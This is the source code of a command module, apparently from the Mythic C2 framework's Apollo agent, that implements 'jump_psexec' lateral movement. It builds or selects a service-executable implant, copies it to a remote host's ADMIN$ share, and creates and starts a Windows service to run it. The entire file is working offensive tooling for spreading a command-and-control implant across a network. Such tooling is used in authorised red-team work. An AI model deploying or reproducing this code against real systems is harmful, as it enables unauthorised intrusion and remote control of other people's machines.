from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
import uuid
import asyncio

class JumpPSEXECArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="Payload",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_payloads,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="specific_payload",
                        ui_position=4
                    ),
                ]
            ),
            CommandParameter(
                name="host",
                cli_name="host",
                display_name="Host",
                type=ParameterType.String,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1
                    ),
                    ParameterGroupInfo(
                        required=True,
                        group_name="specific_payload",
                        ui_position=1
                    )
                ]
            ),
            CommandParameter(
                name="command",
                cli_name="command",
                display_name="Command",
                default_value="C:\\Windows\\apollo.exe",
                type=ParameterType.String,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=3,
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="specific_payload",
                        ui_position=3
                    )
                ]
            ),
            CommandParameter(
                name="remote_path",
                cli_name="remote_path",
                display_name="Remote Upload Location",
                type=ParameterType.String,
                default_value="ADMIN$\\apollo.exe",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="specific_payload",
                        ui_position=2
                    )
                ]
            ),
            CommandParameter(
                name="remote_service_name",
                cli_name="remoteServiceName",
                display_name="Remote Service Name",
                type=ParameterType.String,
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="specific_payload",
                        ui_position=2
                    )
                ]
            ),
        ]

    errorMsg = "Missing required parameter: {}"

    async def get_payloads(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=inputMsg.Callback,
            PayloadTypes=["apollo"],
            IncludeAutoGeneratedPayloads=False,
            BuildParameters=[MythicRPCPayloadSearchBuildParameter(PayloadType="apollo", BuildParameterValues={"output_type": "Service"})]
        ))

        if payload_search.Success:
            file_names = []
            for f in payload_search.Payloads:
                file_names.append(f"{f.Filename} - {f.Description} - {f.UUID}")
            fileResponse.Success = True
            fileResponse.Choices = file_names
            return fileResponse
        else:
            fileResponse.Error = payload_search.Error
            return fileResponse


    async def parse_arguments(self):
        if self.command_line[0] != "{":
            raise Exception("Inject requires JSON parameters and not raw command line.")
        self.load_args_from_json_string(self.command_line)
        if self.get_arg("pid") == 0:
            raise Exception("Required non-zero PID")


async def mirror_up_output(task: PTTaskCompletionFunctionMessage):
    response_search = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(
        TaskID=task.SubtaskData.Task.ID,
    ))
    if response_search.Success:
        for r in response_search.Responses:
            try:
                json_data = json.loads(r.Response)
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.TaskData.Task.ID,
                    Response=json.dumps(json_data, indent=2, sort_keys=True).encode()
                ))
            except:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.TaskData.Task.ID,
                    Response=r.Response.encode()
                ))
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.TaskData.Task.ID,
            Response="\n".encode()
        ))


async def psexec_delete_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = f"error: failed to delete service"
    return response


async def psexec_start_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = f"error: failed to start service"
        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="deleting remote service"
        ))
        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="psexec_delete_callback",
            CommandName="sc",
            Params=json.dumps({
                "computer": task.TaskData.args.get_arg("host"),
                "delete": True,
                "service": task.TaskData.args.get_arg("remote_service_name"),
            })
        ))
    return response


async def psexec_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = f"error: failed to create service"
        return response
    await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
        TaskID=task.TaskData.Task.ID,
        UpdateStatus="starting remote service"
    ))
    subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
        TaskID=task.TaskData.Task.ID,
        SubtaskCallbackFunction="psexec_start_callback",
        CommandName="sc",
        #{"binpath":"C:\\Users\\itsafeature\\Desktop\\apollo_service.exe","service":"apollo","create":true,"display_name":"apollo","computer":""}
        Params=json.dumps({
            "computer": task.TaskData.args.get_arg("host"),
            "start": True,
            "service": task.TaskData.args.get_arg("remote_service_name"),
        })
    ))
    return response


async def upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = f"error: failed to copy over file"
        return response
    await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
        TaskID=task.TaskData.Task.ID,
        UpdateStatus="creating remote service"
    ))
    subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
        TaskID=task.TaskData.Task.ID,
        SubtaskCallbackFunction="psexec_callback",
        CommandName="sc",
        #{"binpath":"C:\\Users\\itsafeature\\Desktop\\apollo_service.exe","service":"apollo","create":true,"display_name":"apollo","computer":""}
        Params=json.dumps({
            "binpath": f"{task.TaskData.args.get_arg('command')}",
            "computer": task.TaskData.args.get_arg("host"),
            "create": True,
            "service": task.TaskData.args.get_arg("remote_service_name"),
            "display_name": task.TaskData.args.get_arg("remote_service_name"),
        })
    ))
    return response


class JumpPSEXeCCommand(CommandBase):
    cmd = "jump_psexec"
    attributes=CommandAttributes(
        dependencies=["sc"]
    )
    needs_admin = True
    help_cmd = "jump_psexec hostname"
    description = "Use sc to move laterally to a new host by first copying over apollo.exe."
    version = 2
    script_only = True
    author = "@its_a_feature_"
    argument_class = JumpPSEXECArguments
    attackmapping = ["T1055"]
    completion_functions = {
        "upload_callback": upload_callback,
        "psexec_callback": psexec_callback,
        "psexec_start_callback": psexec_start_callback,
        "psexec_delete_callback": psexec_delete_callback
    }

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        payload = None
        if (taskData.args.get_arg("remote_path") == "ADMIN$\\apollo.exe" and
            taskData.args.get_arg("command") != "C:\\Windows\\apollo.exe") or (
                taskData.args.get_arg("remote_path") != "ADMIN$\\apollo.exe" and
                taskData.args.get_arg("command") == "C:\\Windows\\apollo.exe"
        ):
            raise Exception("Remote Path and Command must be updated together or neither updated.\nremote_path is the UNC style path of where the payload will be uploaded and command is the local path for executing the command")

        if taskData.args.get_parameter_group_name() == "specific_payload":
            string_payload = [x.strip() for x in taskData.args.get_arg("Payload").split(" - ")]
            str_uuid = string_payload[2]
            payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                PayloadUUID=str_uuid
            ))
            if not payload_search.Success:
                raise Exception("Failed to find payload: {}".format(taskData.args.get_arg("Payload")))

            if len(payload_search.Payloads) == 0:
                raise Exception("No payloads found matching {}".format(taskData.args.get_arg("Payload")))
            payload = payload_search.Payloads[0]
        else:
            payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                IncludeAutoGeneratedPayloads=False,
                PayloadUUID=taskData.Payload.UUID
            ))
            if not payload_search.Success:
                raise Exception("Failed to find payload: {}".format(taskData.Payload.UUID))
            if len(payload_search.Payloads) == 0:
                raise Exception("No payloads found matching {}".format(taskData.Payload.UUID))
            payload = payload_search.Payloads[0]
            if payload.BuildParameters[0].Value != "Service":
                # the current payload is shellcode and not an exe, so we need to generate an exe
                await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
                    TaskID=taskData.Task.ID,
                    UpdateStatus="building Service Apollo..."
                ))
                newPayloadResp = await SendMythicRPCPayloadCreateFromScratch(MythicRPCPayloadCreateFromScratchMessage(
                    TaskID=taskData.Task.ID,
                    PayloadConfiguration=MythicRPCPayloadConfiguration(
                        payload_type="apollo",
                        description=f"Psexec to host {taskData.args.get_arg('host')}",
                        build_parameters=[
                            {"name": "output_type", "value": "Service"}
                        ],
                        selected_os="Windows",
                        filename="apollo_service.exe",
                        commands=payload_search.Payloads[0].Commands,
                        c2_profiles=[x.to_json() for x in payload_search.Payloads[0].C2Profiles],
                    ),
                    RemoteHost=taskData.args.get_arg("host"),
                ))
                if newPayloadResp.Success:
                    # we know a payload is building, now we want it
                    str_uuid = newPayloadResp.NewPayloadUUID
                    while True:
                        resp = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                            PayloadUUID=newPayloadResp.NewPayloadUUID
                        ))
                        if resp.Success:
                            if resp.Payloads[0].BuildPhase == 'success':
                                # it's done, so we can register a file for it
                                payload = resp.Payloads[0]
                                break
                            elif resp.Payloads[0].BuildPhase == 'error':
                                raise Exception("Failed to build new payload ")
                            else:
                                await asyncio.sleep(1)
                else:
                    logger.exception("Failed to build new payload")
                    raise Exception("Failed to build payload from template {}".format(taskData.args.get_arg("template")))
        if payload is None:
            raise Exception("Failed to find payload or generate payload for lateral movement")
        # step 1 - upload payload to remote host at remote location
        # step 2 - kick off wmiexecute for remote host to run remote_command
        response.DisplayParams = f"{payload.Filename} onto \\\\{taskData.args.get_arg('host')}\\{taskData.args.get_arg('remote_path')}"
        response.TaskStatus = "uploading file..."
        service_name = taskData.args.get_arg("remote_service_name")
        if service_name == "":
            service_name = str(uuid.uuid4())
            taskData.args.set_arg("remote_service_name", service_name)
        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            TaskID=taskData.Task.ID,
            SubtaskCallbackFunction="upload_callback",
            CommandName="upload",
            Params=json.dumps({
                "remote_path": f"\\\\{taskData.args.get_arg('host')}\\{taskData.args.get_arg('remote_path')}",
                "file": payload.AgentFileId
            })
        ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
